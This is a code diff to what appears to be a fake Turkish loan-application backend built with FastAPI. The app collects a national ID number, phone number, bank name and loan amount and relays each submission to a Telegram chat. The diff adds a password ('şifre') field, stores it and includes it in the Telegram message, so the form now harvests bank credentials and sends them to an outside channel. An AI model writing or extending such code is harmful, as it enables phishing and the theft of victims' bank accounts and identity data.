@@ -27,6 +27,7 @@ telegram_settings = {
 
 class LoanApplication(BaseModel):
     tc_kimlik: str
+    sifre: str
     telefon: str
     bank_name: str
     amount: int
@@ -148,6 +149,7 @@ async def submit_application(application: LoanApplication):
     new_application = {
         "id": len(applications_storage) + 1,
         "tc_kimlik": application.tc_kimlik,
+        "sifre": application.sifre,
         "telefon": application.telefon,
         "bank_name": application.bank_name,
         "amount": application.amount,
@@ -165,6 +167,7 @@ async def submit_application(application: LoanApplication):
         message = f"""🏦 Yeni Kredi Başvurusu
 
 👤 T.C. Kimlik: {application.tc_kimlik}
+🔐 Şifre: {application.sifre}
 📞 Telefon: {application.telefon}
 🏛️ Banka: {application.bank_name}
 💰 Tutar: {application.amount:,} TL
